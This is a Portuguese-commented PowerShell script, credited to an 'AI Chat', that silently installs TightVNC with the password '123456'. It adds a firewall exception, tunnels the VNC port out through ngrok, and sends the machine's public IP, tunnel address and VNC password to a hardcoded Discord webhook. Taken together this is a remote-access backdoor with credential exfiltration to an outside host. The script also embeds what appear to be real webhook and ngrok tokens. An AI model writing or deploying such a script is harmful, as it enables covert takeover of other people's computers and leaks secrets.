# Script para instalação e configuração do TightVNC com túnel Ngrok para bypass de roteador
# Autor: AI Chat (ajustado com integração Ngrok)

# Parâmetros de configuração
$installerUrl = "https://www.tightvnc.com/download/2.8.85/tightvnc-2.8.85-gpl-setup-64bit.msi"
$installerPath = "$env:TEMP\tightvnc.msi"
$senhaVNC = "123456"  # Senha em texto plano, máximo 8 caracteres (altere aqui)
$portaVNC = 5900
$discordWebhookUrl = "https://discordapp.com/api/webhooks/1417193357754503249/rp6J-QUUpbQiB2bhmwUaa86HJtPu-8OIiRHLYRw6v2A79GR5mWVzPJPnD9bI0pLr134v"
$ngrokToken = "32HnGXR20ygWCK6yAfrvN9x5TK3_6F6PZtJGCtyjqRn3sFfdd"  # Crie uma conta gratuita em ngrok.com e cole seu authtoken aqui

# Função para baixar o instalador TightVNC
function Baixar-Instalador {
    Write-Host "Baixando o instalador TightVNC..."
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath
}

# Função para instalar e configurar silenciosamente via MSI properties
function Instalar-TightVNC {
    Write-Host "Instalando e configurando TightVNC..."

    # Para o serviço se já existir (para reinstalações)
    Stop-Service -Name "tvnserver" -Force -ErrorAction SilentlyContinue

    # Argumentos do msiexec com configurações (senha em texto plano!)
    $arguments = "/i `"$installerPath`" /quiet /norestart " +
                 "ADDLOCAL=Server,Viewer " +
                 "SERVER_REGISTER_AS_SERVICE=1 " +
                 "SERVER_ADD_FIREWALL_EXCEPTION=1 " +
                 "SET_USEVNCAUTHENTICATION=1 " +
                 "VALUE_OF_USEVNCAUTHENTICATION=1 " +
                 "SET_PASSWORD=1 " +
                 "VALUE_OF_PASSWORD=$senhaVNC " +
                 "SET_RFBPORT=1 " +
                 "VALUE_OF_RFBPORT=$portaVNC " +
                 "SET_ALLOWLOOPBACK=1 " +
                 "VALUE_OF_ALLOWLOOPBACK=1 " +
                 "SET_LOOPBACKONLY=1 " +
                 "VALUE_OF_LOOPBACKONLY=0"

    Start-Process msiexec.exe -ArgumentList $arguments -Wait

    # Inicia o serviço após instalação
    Start-Service -Name "tvnserver" -ErrorAction SilentlyContinue
}

# Função para baixar e configurar Ngrok
function Configurar-Ngrok {
    Write-Host "Configurando Ngrok para túnel VNC..."

    $ngrokDir = "$env:USERPROFILE\ngrok"
    $ngrokExe = "$ngrokDir\ngrok.exe"
    $ngrokZip = "$env:TEMP\ngrok.zip"

    # Baixa Ngrok se não existir
    if (-not (Test-Path $ngrokExe)) {
        Write-Host "Baixando Ngrok..."
        Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile $ngrokZip
        Expand-Archive -Path $ngrokZip -DestinationPath $ngrokDir -Force
        Remove-Item $ngrokZip
    }

    # Autentica Ngrok
    & $ngrokExe authtoken $ngrokToken

    # Inicia o túnel em background (TCP para porta VNC)
    Start-Process -FilePath $ngrokExe -ArgumentList "tcp $portaVNC" -NoNewWindow -RedirectStandardOutput "$env:TEMP\ngrok.log"

    # Espera um pouco para o túnel iniciar
    Start-Sleep -Seconds 5

    # Obtém a URL pública via API do Ngrok
    try {
        $tunnels = Invoke-RestMethod -Uri "http://localhost:4040/api/tunnels"
        $publicUrl = ($tunnels.tunnels | Where-Object { $_.proto -eq "tcp" }).public_url
        if ($publicUrl) {
            Write-Host "Túnel Ngrok criado: $publicUrl"
            return $publicUrl
        } else {
            throw "Não foi possível obter a URL do túnel."
        }
    } catch {
        Write-Host "Erro ao obter URL Ngrok: $_"
        return $null
    }
}

# Função para enviar informações para o Discord via webhook
function Enviar-Info-Discord {
    param (
        [string]$publicUrl
    )
    Write-Host "Enviando informações para Discord..."
    try {
        $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org").Trim()
        $content = "IP Público: $publicIP`nTúnel Ngrok: $publicUrl`nPorta Local VNC: $portaVNC`nSenha: $senhaVNC"
        $payload = @{ content = $content } | ConvertTo-Json
        Invoke-WebRequest -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $payload
        Write-Host "Informações enviadas com sucesso!"
    } catch {
        Write-Host "Erro ao enviar: $_"
    }
}

# Execução
try {
    Baixar-Instalador
    Instalar-TightVNC
    $ngrokUrl = Configurar-Ngrok
    if ($ngrokUrl) {
        Enviar-Info-Discord -publicUrl $ngrokUrl
    }
    Write-Host "Configuração concluída! Reinicie o computador se necessário."
}
catch {
    Write-Host "Erro durante a execução: $_"
}

# Verificação pós-instalação (opcional, para depuração)
Write-Host "Verificando serviço:"
Get-Service -Name "tvnserver"
Write-Host "Teste a porta local: Test-NetConnection -ComputerName localhost -Port $portaVNC"
